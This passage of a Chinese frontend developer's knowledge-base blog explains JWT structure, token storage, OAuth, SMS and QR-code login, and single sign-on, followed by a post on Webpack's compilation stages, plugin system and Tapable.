<p><strong>Public</strong><br>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.<br><strong>Private</strong><br>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为 base64 是对称解密的，意味着该部分信息可以归类为明文信息。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span> <span class="comment">// 预定义</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hore_brother&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">  <span class="comment">// 用户名 等session信息</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">HMACSHA256</span>(<span class="title function_">base64UrlEncode</span>(header) + <span class="string">&quot;.&quot;</span> + <span class="title function_">base64UrlEncode</span>(payload), secret);</span><br></pre></td></tr></table></figure>

<p>将 Header 和 Payload 加一段密钥通过 HMAC 加密而来， 防止篡改信息<br>HMAC 算法是不可逆算法，类似 MD5 和 hash ，但多一个密钥，密钥（即上面的 secret）由服务端持有，客户端把 token 发给服务端后，服务端可以把其中的头部和载荷再加上事先共享的 secret 再进行一次 HMAC 加密，得到的结果和 token 的第三段进行对比，如果一样则表明数据没有被篡改</p>
<p>​</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
<li>支持跨域访问: Cookie 是不允许垮域访问的，token 支持</li>
<li>无状态： token 无状态，session 有状态的</li>
<li>去耦: 不需要绑定到一个特定的身份验证方案。Token 可以在任何地方生成，只要在你的 API 被调用的时候， 你可 以进行 Token 生成调用即可</li>
<li>更适用于移动应用: Cookie 不支持手机端访问的</li>
<li>性能: 在网络传输的过程中，性能更好</li>
<li>基于标准化: 你的 API 可以采用标准化的 JSON Web Token (JWT). 这个标准已经存在 多个后端库（.NET, Ruby, Java,Python, PHP）和多家公司的支持（如： Firebase,Google, Microsoft）</li>
</ul>
<h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><ul>
<li>session 要求服务端存储信息，并且根据 id 能够检索，而 token 不不需要（因为信息就在 token 中，这样实现了服务端无状态化）。在大规模系统中，对每个请求都检索会话信息可能是一个复杂和耗时的过程。但另一方面服务端要通过 token 来解析用户身份也需要定义好相应的协议（比如 JWT）。</li>
<li>session 一般通过 cookie 来交互，而 token 可以是 cookie，也可以是 header，也可以放在请求的内容中。不使用 cookie 可以带来跨域上的便利性。</li>
<li>token 的生成方式更更加多样化，可以由第三方模块来提供。</li>
<li>token 若被盗用，服务端无法感知，cookie 信息存储在用户电脑中，被盗用风险非常小。</li>
</ul>
<p>​</p>
<h3 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h3><p>存 localstorage 会被 xss 攻击，建议不放在 js 可读的地方<br>存 cookie+httpOnly，加 csrf token 防止 CSRF 攻击<br>​</p>
<h3 id="登录状态保持"><a href="#登录状态保持" class="headerlink" title="登录状态保持"></a>登录状态保持</h3><p>假如我们想要活跃的用户能一直保持登录状态的话，就需要快到 15 分钟的时候，去重新颁发一个 token 来延长登录有效期。而这时就会对同一个用户同时存在两个有效的 token，所以我们在重新颁发一个 token 的同时，还需要将快要过期的 token 拉黑，使其失效。<br>主动让一个 jwt 失效就很好实现了，把这个用户的密钥从缓存中删除就可以了</p>
<p>​</p>
<h3 id="多端登录"><a href="#多端登录" class="headerlink" title="多端登录"></a>多端登录</h3><p>不允许多端登录，一边登录就要把另一边挤下线，意思就是一个账号只有允许一个 Token，然后其他地方登录，就会生成新的 Token 再存到数据库，就把之前的给替换掉了，那么用之前的 Token 登录的地方就会下线了</p>
<h2 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h2><p>OAuth 鉴权本质就是两个协商的过程，从而确定网站以及用户的一一对应关系，并且获取用户的意向（同意还是不同意）</p>
<ul>
<li>网站和第三方之间的协商</li>
<li>用户和第三方之间的协商</li>
</ul>
<p>再根据协商结果去做进一步操作，从而确定访问权限<br>​</p>
<h3 id="网站和第三方之间的协商"><a href="#网站和第三方之间的协商" class="headerlink" title="网站和第三方之间的协商"></a>网站和第三方之间的协商</h3><p>需要提前在第三方网站注册登记网站域名、需要获取的用户信息和权限等必要信息，申请审核通过后进入第三方网站的白名单。获得密钥等下一步协商需要的信息。</p>
<h3 id="用户和第三方之间的协商"><a href="#用户和第三方之间的协商" class="headerlink" title="用户和第三方之间的协商"></a>用户和第三方之间的协商</h3><p>登录时，跳转到第三方，跳转地址上拼接后端加密过的签名、登录成功的 redirect_uri 等信息。用户在新的页面中完成和第三方网站的协商，验证通过后，把验证参数加进 redirect_uri 里面再跳转回去。后端再次请求第三方接口验证上一步获得的验证参数和获取用户名、头像等信息，进一步判断是否登录成功。</p>
<h2 id="其他登录"><a href="#其他登录" class="headerlink" title="其他登录"></a>其他登录</h2><h3 id="手机-邮箱验证码登录"><a href="#手机-邮箱验证码登录" class="headerlink" title="手机/邮箱验证码登录"></a>手机/邮箱验证码登录</h3><p>后端收到手机号后生成随机数，拼接短信发送到第三方短信平台。用户验证登录，后端和数据库对比，成功返回用户信息。<br>假如短信内容不合规/短信平台没钱/异常等应记录在日志上。<br>邮箱逻辑一样。<br>​</p>
<h3 id="APP-扫码"><a href="#APP-扫码" class="headerlink" title="APP 扫码"></a>APP 扫码</h3><ul>
<li>进入页面首先获取生成二维码所需要的信息，调接口</li>
<li>然后后端生成比如 uuid 等，并设置设置过期时间存到缓存中，然后把信息 uuid 等返回给前端</li>
<li>前端拿到信息后，用这些信息作为上述代码中的 url，生成二维码，接着调用另一个接口把 uuid 传过去，并开启<strong>轮循</strong>、<strong>或者长连接</strong>，或者不调接口直接用 <strong>WebSocket</strong> 监听。具体使用哪一个看自己的业务需求或者和后端商量</li>
<li>然后手机端这边肯定是处于登录状态的，不然也没法扫码登录，然后 App 扫码，就会获取到二维码中的 uuid</li>
<li>接着手机端点登录之后，就把 uuid 和这个登录了手机端的用户账号信息，发送给后端</li>
<li>后端拿到登录的这个帐号信息，通过 WebSocket 发送给前端，就登录成功了。或者修改缓存中的值，比如把 uuid 存起来的时候是把 uuid 作为 key，但是没有值，然后轮询接口就是获取这个 uuid 的值，没登录之前获取的就是个空的，App 点登录之后，后端把拿到的用户信息等作为值赋给对应的 uuid，前端这边轮询查到的数据就不是空的了，就说明登录成功，然后后端再清掉这个缓存</li>
</ul>
<p>​</p>
<h3 id="指纹-刷脸登录-本机号码免密登录"><a href="#指纹-刷脸登录-本机号码免密登录" class="headerlink" title="指纹/刷脸登录/本机号码免密登录"></a>指纹/刷脸登录/本机号码免密登录</h3><p>接入 SDK，用户授权后，SDK 与运营商通信来获得用户手机号码，然后用户点击一键登录授权，通过网关取号对比，并返回对比结果实现一键登录</p>
<h2 id="单点登录-SSO"><a href="#单点登录-SSO" class="headerlink" title="单点登录 SSO"></a>单点登录 SSO</h2><p>单点登录就是在多个系统中，用户只需一次登录，各个系统即可感知该用户已经登录。<br>单系统登录假如用 session 保存用户信息，不同系统之间的 session 是<strong>不共享</strong>的。几个方案：</p>
<ol>
<li> session 全局复制（影响集群性能）</li>
<li> 将请求 IP 进行 Hash 映射到对应机器上（服务器宕机会丢失大部分 session 数据）</li>
<li> Redis</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/webp/106384/1631591536339-c8a770a6-af21-421a-b91c-76e1873e42d9.webp#clientId=u60fdaa12-1e32-4&from=paste&id=u9f488259&margin=%5Bobject%20Object%5D&originHeight=936&originWidth=1691&originalType=url%E2%88%B6=1&status=done&style=none&taskId=uf9ddd834-fa29-4b16-b7fe-46fe5648dda"><br>SSO：将登录单独抽取出来做成子系统，登录系统登录后返回 token 写到 cookie，登录其他子系统是带上 cookie</p>
<h3 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h3><p>首先，用户想要访问系统 A<a href="http://www.java3y.com受限的资源(比如说购物车功能，购物车功能需要登录后才能访问)，系统Awww.java3y.com发现用户并没有登录，于是重定向到sso认证中心，并将自己的地址作为参数。请求的地址如下：">www.java3y.com受限的资源(比如说购物车功能，购物车功能需要登录后才能访问)，系统Awww.java3y.com发现用户并没有登录，于是重定向到sso认证中心，并将自己的地址作为参数。请求的地址如下：</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.<span class="property">sso</span>.<span class="property">com</span>?service=www.<span class="property">java3y</span>.<span class="property">com</span></span><br></pre></td></tr></table></figure>

<p>sso 认证中心发现用户未登录，将用户引导至登录页面，用户进行输入用户名和密码进行登录，用户与认证中心建立全局会话（生成一份 Token，写到 Cookie 中，保存在浏览器上）<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1631592145339-49130b5f-eb04-4cf1-bcfe-b6ef4c6354b9.png#clientId=u60fdaa12-1e32-4&from=paste&id=u48beed68&margin=%5Bobject%20Object%5D&name=image.png&originHeight=418&originWidth=720&originalType=url%E2%88%B6=1&size=173123&status=done&style=none&taskId=u8d25cb71-8e6f-46a3-b524-77bbba1f0a6" alt="image.png"><br>随后，认证中心重定向回系统 A，并把 Token 携带过去给系统 A，重定向的地址如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.<span class="property">java3y</span>.<span class="property">com</span>?token=xxxxxxx</span><br></pre></td></tr></table></figure>

<p>接着，系统 A 去 sso 认证中心验证这个 Token 是否正确，如果正确，则系统 A 和用户建立局部会话（创建 Session）。到此，系统 A 和用户已经是登录状态了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1631592124219-62ff4e59-1c5a-421b-97df-92d1e343bd97.png#clientId=u60fdaa12-1e32-4&from=paste&id=u490440a7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=324&originWidth=720&originalType=url%E2%88%B6=1&size=166774&status=done&style=none&taskId=uc723f026-4e96-4753-8d4b-9d0a618f85e" alt="image.png"><br>此时，用户想要访问系统 B<a href="http://www.java4y.com受限的资源(比如说订单功能，订单功能需要登录后才能访问)，系统Bwww.java4y.com发现用户并没有登录，于是重定向到sso认证中心，并将自己的地址作为参数。请求的地址如下：">www.java4y.com受限的资源(比如说订单功能，订单功能需要登录后才能访问)，系统Bwww.java4y.com发现用户并没有登录，于是重定向到sso认证中心，并将自己的地址作为参数。请求的地址如下：</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.<span class="property">sso</span>.<span class="property">com</span>?service=www.<span class="property">java4y</span>.<span class="property">com</span></span><br></pre></td></tr></table></figure>

<p>注意，因为之前用户与认证中心<a target="_blank" rel="noopener" href="http://www.sso.com已经建立了全局会话(当时已经把cookie保存到浏览器上了),所以这次系统b重定向到认证中心www.sso.com是可以带上cookie的./">www.sso.com已经建立了全局会话（当时已经把Cookie保存到浏览器上了），所以这次系统B重定向到认证中心www.sso.com是可以带上Cookie的。</a></p>
<p>认证中心根据带过来的 Cookie 发现已经与用户建立了全局会话了，认证中心重定向回系统 B，并把 Token 携带过去给系统 B，重定向的地址如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.<span class="property">java4y</span>.<span class="property">com</span>?token=xxxxxxx</span><br></pre></td></tr></table></figure>

<p>接着，系统 B 去 sso 认证中心验证这个 Token 是否正确，如果正确，则系统 B 和用户建立局部会话（创建 Session）。到此，系统 B 和用户已经是登录状态了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1631592099638-f5645a17-3808-4886-80f3-173e5e063e70.png#clientId=u60fdaa12-1e32-4&from=paste&id=u6a1db672&margin=%5Bobject%20Object%5D&name=image.png&originHeight=372&originWidth=720&originalType=url%E2%88%B6=1&size=191771&status=done&style=none&taskId=u78f8538d-cf7b-4aa8-b679-be06bb6684d" alt="image.png"><br>​</p>
<h3 id="cookie-跨域问题"><a href="#cookie-跨域问题" class="headerlink" title="cookie 跨域问题"></a>cookie 跨域问题</h3><ul>
<li>绕开同源策略</li>
<li>子网站使用同一个一级域名，把 cookie 设置给顶级域</li>
<li>强制推送 cookie</li>
<li>token 保存在 sessionstorage</li>
</ul>
<p>​</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/62336927">https://zhuanlan.zhihu.com/p/62336927</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/66037342">https://zhuanlan.zhihu.com/p/66037342</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6958832703106433061">https://juejin.cn/post/6958832703106433061</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/7005725809822416909">https://juejin.cn/post/7005725809822416909</a><br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/301253397/answer/548334082">https://www.zhihu.com/question/301253397/answer/548334082</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/08/31/Webpack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/31/Webpack/" class="post-title-link" itemprop="url">Webpack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-31 11:19:07" itemprop="dateCreated datePublished" datetime="2021-08-31T11:19:07+08:00">2021-08-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:04" itemprop="dateModified" datetime="2022-02-14T19:41:04+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630381728676-994c1dec-1347-4b7a-b0a7-d6c9afff47f6.png#clientId=uca7be9d5-6f50-4&from=paste&height=502&id=u976bc229&margin=%5Bobject%20Object%5D&name=image.png&originHeight=502&originWidth=1133&originalType=binary%E2%88%B6=1&size=50453&status=done&style=none&taskId=ub33fa864-ab09-4550-b351-3d960369383&width=1133" alt="image.png"></p>
<ul>
<li>资源构建</li>
</ul>
<p>浏览器无法识别部分前端资源（ts/sass），需要经过编译处理，webpack 集成编译工具</p>
<ul>
<li>静态模块打包</li>
</ul>
<p>对图片等静态资源，webpack 根据引用关系，构建依赖关系图，然后将静态模块打包成 bundle 输出。打包各环节还可以进行图片压缩、js 混淆等额外处理</p>
<ul>
<li>调用后端接口跨域</li>
</ul>
<p>通过 devServer</p>
<ul>
<li>热更新</li>
</ul>
<p>通过内置热更新模块</p>
<ul>
<li>ES+语法兼容性</li>
</ul>
<p>通过引入 babel 等根据</p>
<h2 id="核心流程"><a href="#核心流程" class="headerlink" title="核心流程"></a>核心流程</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/106384/1630401267510-b93845f7-0058-4ef9-a19f-199b7079f47b.jpeg#clientId=uca7be9d5-6f50-4&from=paste&height=1774&id=u8be6334b&margin=%5Bobject%20Object%5D&name=%E6%9C%AA%E5%91%BD%E5%90%8D%E5%9B%BE%E7%89%87.jpg&originHeight=1774&originWidth=1726&originalType=binary%E2%88%B6=1&size=405815&status=done&style=none&taskId=ubc5a41ae-3753-4da0-8d04-60cbe3942d0&width=1726" alt="未命名图片.jpg"></p>
<ol>
<li>初始化阶段：<ol>
<li>初始化参数：从配置文件、 配置对象、Shell 参数中读取，与默认配置结合得出最终的参数</li>
<li>创建编译器对象：用上一步得到的参数创建 **Compiler **对象（包含了 Webpack <strong>环境所有的的配置信息</strong>，包含 options，loaders，plugins 信息，它是全局唯一的）</li>
<li>初始化编译环境：包括<strong>注入内置插件</strong>、注册各种模块工厂、初始化 RuleSet 集合、<strong>加载配置的 Plugin</strong>等</li>
<li>开始编译：执行 compiler 对象的 <strong>run</strong> 方法</li>
<li>确定入口：根据配置中的 entry 找出所有的入口文件，调用 compilation.addEntry 将入口文件转换为 <strong>dependence</strong> 对象</li>
</ol>
</li>
<li>构建阶段：<ol>
<li>编译模块(make)：根据 entry 对应的 dependence 创建 <strong>module</strong> 对象，调用** loader **将模块转译为标准 JS 内容，调用 JS 解释器将内容转换为 <strong>AST</strong> 对象，从中找出该模块依赖的模块，再 **递归 **本步骤直到所有入口依赖的文件都经过了本步骤的处理</li>
<li>完成模块编译：上一步递归处理所有能触达到的模块后，得到了每个模块被翻译后的内容以及它们之间的 <strong>依赖关系图</strong></li>
</ol>
</li>
<li>生成阶段：<ol>
<li>输出资源(seal)：根据入口和模块之间的依赖关系，组装成一个个包含多个模块的** Chunk**，再把每个 Chunk 转换成一个单独的文件加入到输出列表，这步是可以修改输出内容的最后机会</li>
<li>写入文件系统(emitAssets)：在确定好输出内容后，根据配置确定输出的路径和文件名，把文件内容写入到文件系统</li>
</ol>
</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630465762270-b013cb5d-7b81-4dd7-902f-ea98c995cb4e.png#clientId=uca7be9d5-6f50-4&from=paste&id=u18c66a64&margin=%5Bobject%20Object%5D&name=image.png&originHeight=814&originWidth=1254&originalType=url%E2%88%B6=1&size=162045&status=done&style=none&taskId=u0aea49ab-5e96-4e59-b799-6de478119ce" alt="image.png"></p>
<ul>
<li>compiler.make 阶段：<ul>
<li>entry 文件以 dependence 对象形式加入 compilation 的依赖列表，dependence 对象记录有 entry 的类型、路径等信息</li>
<li>根据 dependence 调用对应的工厂函数创建 module 对象，之后读入 module 对应的文件内容，调用 loader-runner 对内容做转化，转化结果若有其它依赖则继续读入依赖资源，重复此过程直到所有依赖均被转化为 module</li>
</ul>
</li>
<li>compilation.seal 阶段：<ul>
<li>遍历 module 集合，根据 entry 配置及引入资源的方式，将 module 分配到不同的 chunk</li>
<li>遍历 chunk 集合，调用 compilation.emitAsset 方法标记 chunk 的输出规则，即转化为 assets 集合</li>
</ul>
</li>
<li>compiler.emitAssets 阶段：<ul>
<li>将 assets 写入文件系统.</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630574715011-d187e39b-b82b-4a1b-b255-ba351badc5a4.png#clientId=uad1c3d9d-4039-4&from=paste&height=792&id=ua78b00e6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=792&originWidth=1494&originalType=binary%E2%88%B6=1&size=659082&status=done&style=none&taskId=uf350a206-9047-4547-bfce-259ba45c211&width=1494" alt="image.png"><br>​</p>
<h2 id="初始化阶段"><a href="#初始化阶段" class="headerlink" title="初始化阶段"></a>初始化阶段</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/106384/1630402291001-d48cf483-0fad-477f-bca5-f73f7cae4c8f.jpeg#clientId=uca7be9d5-6f50-4&from=paste&height=1874&id=uef2f8fb7&margin=%5Bobject%20Object%5D&name=%E5%88%9D%E5%A7%8B%E5%8C%96.jpg&originHeight=1874&originWidth=2954&originalType=binary%E2%88%B6=1&size=537373&status=done&style=none&taskId=u4756ea0e-0ac0-42d9-b52d-7c3f877cdd9&width=2954" alt="初始化.jpg"><br>WebpackOptionsApply 会在初始化阶段根据配置内容动态注入对应的插件，包括：</p>
<ul>
<li>注入 EntryOptionPlugin 插件，处理 entry 配置</li>
<li>根据 devtool 值判断后续用那个插件处理 sourcemap，可选值：EvalSourceMapDevToolPlugin、SourceMapDevToolPlugin、EvalDevToolModulePlugin</li>
<li>注入 RuntimePlugin ，用于根据代码内容动态注入 webpack 运行时</li>
</ul>
<p>​</p>
<p>​</p>
<h2 id="构建阶段"><a href="#构建阶段" class="headerlink" title="构建阶段"></a>构建阶段</h2><p>构建阶段从 entry 开始递归解析资源与资源的依赖，在 compilation 对象内逐步<strong>构建出 module 集合以及 module 之间的依赖关系</strong>，核心流程：<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/106384/1630575345002-7faa3cc8-289c-4c88-8acd-1114661930bd.jpeg#clientId=uad1c3d9d-4039-4&from=paste&height=1854&id=u814bb222&margin=%5Bobject%20Object%5D&name=%E6%9E%84%E5%BB%BA%20%281%29.jpg&originHeight=1854&originWidth=2574&originalType=binary%E2%88%B6=1&size=519841&status=done&style=none&taskId=uf5e31a9a-494a-40c9-89d2-d5504d3fb50&width=2574" alt="构建 (1).jpg"><br>这个过程中数据流 <strong>module =&gt; ast =&gt; dependences =&gt; module <strong>，先转 AST 再识别 require/ import 之类的导入语句，确定模块对其他资源的依赖关系。<br>比如说对于图片，需要从图像二进制转换成类似于 export default “data:image/png;base64,xxx” 这类 base64 格式或者 export default “<a target="_blank" rel="noopener" href="http://xxx"/">http://xxx”</a> 这类 url 格式。<br>compilation 按这个流程递归处理，逐步解析出每个模块的内容以及 module 依赖关系，后续就可以根据这些内容打包输出。<br>Compilation 对象包含了</strong>当前的模块资源、编译生成资源、变化的文件</strong>等。当 Webpack 以开发模式运行时，每当检测到一个文件变化，一次新的 Compilation 将被创建。Compilation 对象也提供了很多事件回调供插件做扩展。通过 Compilation 也能读取到 Compiler 对象<br>Compiler 和 Compilation 的区别在于：<strong>Compiler 代表了整个 Webpack 从启动到关闭的生命周期，而 Compilation 只是代表了一次新的编译</strong><br>​</p>
<p>​</p>
<h2 id="生成阶段"><a href="#生成阶段" class="headerlink" title="生成阶段"></a>生成阶段</h2><p>生成阶段<strong>围绕 chunks 展开</strong>。经过构建阶段之后，webpack 得到足够的模块内容与模块关系信息，接下来开始生成最终资源了。<br>seal 函数主要完成从 module 到 chunks 的转化，核心流程：<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/106384/1630466193516-2fbd5ac0-2857-4274-8ef8-51d28b8eda34.jpeg#clientId=uca7be9d5-6f50-4&from=paste&height=2260&id=u1e930c54&margin=%5Bobject%20Object%5D&name=%E7%94%9F%E6%88%90.jpg&originHeight=2260&originWidth=1814&originalType=binary%E2%88%B6=1&size=636342&status=done&style=none&taskId=ueeaf714c-6dc1-4dfe-8d64-da30b8e6e25&width=1814" alt="生成.jpg"></p>
<p>webpack 内置的 chunk 封装规则比较简单：</p>
<ul>
<li>entry 及 entry 触达到的模块，组合成一个 chunk</li>
<li>使用动态引入语句引入的模块，各自组合成一个 chunk</li>
<li>chunk 公共代码的提取和异步加载需要代码分割来实现</li>
</ul>
<p>chunk 是输出的基本单位，默认情况下这些 chunks 与最终输出的资源一一对应，那按上面的规则大致上可以推导出一个 entry 会对应打包出一个资源，而通过动态引入语句引入的模块，也对应会打包出相应的资源<br>​</p>
<p>​</p>
<h2 id="Plugin"><a href="#Plugin" class="headerlink" title="Plugin"></a>Plugin</h2><p>Webpack 通过 Plugin 机制让其更加灵活，以适应各种应用场景。 在 Webpack 运行的生命周期中会广播出许多事件，Plugin 可以监听这些事件，在合适的时机通过 Webpack 提供的 API 改变输出结果。<br>webpack 的插件体系基于<strong>tapable</strong>实现的发布订阅模式构建<strong>，</strong>是一种非常强耦合的设计，hooks 回调由 webpack 决定何时，以何种方式执行；而在 hooks 回调内部可以通过修改状态、调用上下文 api 等方式对 webpack 产生 side effect。</p>
<ul>
<li><em>发布订阅模式与观察者模式的不同，“第三者” （事件中心）出现。目标对象并不直接通知观察者，而是通过事件中心来派发通知。</em></li>
</ul>
<p>一个最基础的 Plugin 的代码是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BasicPlugin</span> &#123;</span><br><span class="line">  <span class="comment">// 在构造函数中获取用户给该插件传入的配置</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">options</span>) &#123;&#125;</span><br><span class="line">  <span class="comment">// Webpack 会调用 BasicPlugin 实例的 apply 方法给插件实例传入 compiler / Compilation 对象， 并且可以通过 compiler 对象去操作 Webpack。</span></span><br><span class="line">  <span class="title function_">apply</span>(<span class="params">compiler</span>) &#123;</span><br><span class="line">    <span class="comment">// 监听事件</span></span><br><span class="line">    <span class="comment">// 异步的事件需要在插件处理完任务时调用回调函数通知 Webpack 进入下一个流程，不然会卡住;</span></span><br><span class="line">    compiler.<span class="title function_">plugin</span>(<span class="string">&quot;compilation&quot;</span>, <span class="keyword">function</span> (<span class="params">compilation</span>) &#123;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 导出 Plugin</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">BasicPlugin</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Tapable"><a href="#Tapable" class="headerlink" title="Tapable"></a><a target="_blank" rel="noopener" href="https://github.com/webpack/tapable">Tapable</a></h3><p>Tapable 是 Webpack 插件架构的核心支架，本质上就是围绕着 订阅/发布 模式叠加各种特化逻辑，适配 webpack 体系下复杂的事件源-处理器之间交互需求，比如说有些场景需要支持将前一个处理器的结果传入下一个回调处理器；有些场景需要支持异步并行调用这些回调处理器。<br>Tapable 使用时通常需要经历如下步骤：<br>创建钩子实例（成对出现）：</p>
<ul>
<li>调用订阅接口注册回调，包括：tap、tapAsync、tapPromise</li>
<li>调用发布接口触发回调，包括：call、callAsync、promise</li>
</ul>
<h4 id="动态编译"><a href="#动态编译" class="headerlink" title="动态编译"></a>动态编译</h4><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6955421936373465118">https://juejin.cn/post/6955421936373465118</a></p>
<h3 id="钩子触发"><a href="#钩子触发" class="headerlink" title="钩子触发"></a>钩子触发</h3><h4 id="总流程"><a href="#总流程" class="headerlink" title="总流程"></a>总流程</h4><h4 id="compiler-对象"><a href="#compiler-对象" class="headerlink" title="compiler 对象"></a>compiler 对象</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/106384/1630468659028-d7803d2a-de68-4ab1-8645-f565971f8a3f.jpeg#clientId=uca7be9d5-6f50-4&from=paste&height=713&id=Ve7qO&margin=%5Bobject%20Object%5D&name=image.jpg&originHeight=713&originWidth=678&originalType=binary%E2%88%B6=1&size=99660&status=done&style=none&taskId=uee06ee96-6a2d-4ec1-b61f-1584ebad6e6&width=678" alt="image.jpg"></p>
<h4 id="compilation-对象"><a href="#compilation-对象" class="headerlink" title="compilation 对象"></a>compilation 对象</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630466659503-fb29acd3-e2ff-40ed-afda-8fcf4b77ac12.png#clientId=uca7be9d5-6f50-4&from=paste&id=ue921f064&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2243&originWidth=760&originalType=url%E2%88%B6=1&size=163196&status=done&style=none&taskId=uebc60d66-9e3c-44c4-9b98-ca13f164eb3" alt="image.png"></p>
<h3 id="常用-plugin"><a href="#常用-plugin" class="headerlink" title="常用 plugin"></a>常用 plugin</h3><ul>
<li>define-plugin：定义环境变量 (Webpack4 之后指定 mode 会自动配置)</li>
<li>ignore-plugin：忽略部分文件</li>
<li>html-webpack-plugin：简化 HTML 文件创建 (依赖于 html-loader)</li>
<li>web-webpack-plugin：可方便地为单页应用输出 HTML，比 html-webpack-plugin 好用</li>
<li>uglifyjs-webpack-plugin：不支持 ES6 压缩 (Webpack4 以前)</li>
<li>terser-webpack-plugin: 支持压缩 ES6 (Webpack4)</li>
<li>webpack-parallel-uglify-plugin: 多进程执行代码压缩，提升构建速度</li>
<li>mini-css-extract-plugin: 分离样式文件，CSS 提取为独立文件，支持按需加载 (替代 extract-text-webpack-plugin)</li>
<li>serviceworker-webpack-plugin：为网页应用增加离线缓存功能</li>
<li>clean-webpack-plugin: 目录清理</li>
<li>ModuleConcatenationPlugin: 开启 Scope Hoisting</li>
<li>speed-measure-webpack-plugin: 可以看到每个 Loader 和 Plugin 执行耗时 (整个打包耗时、每个 Plugin 和 Loader 耗时)</li>
<li>webpack-bundle-analyzer: 可视化 Webpack 输出文件的体积 (业务组件、依赖第三方模块)</li>
</ul>
<p>​</p>
